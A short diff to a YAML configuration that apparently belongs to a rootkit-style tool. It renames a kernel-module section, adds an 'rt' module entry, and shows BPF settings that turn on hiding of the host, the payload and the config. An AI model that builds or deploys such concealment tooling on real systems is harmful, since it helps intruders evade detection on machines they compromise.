@@ -1,4 +1,4 @@
-kernel_module_config:
+rnet:
   # Path to the kernel module
   path: ./bin/rnet.ko
   name: rnet
@@ -14,6 +14,11 @@ bpf_program_config:
   hide_host: true
   hide_payload: true
   hide_config: true
+
+rt:
+  module_path: ./bin/rt.ko
+  module_name: rt
+  program_path: ./bin/main
 
 payload:
   path: ./bin/payload
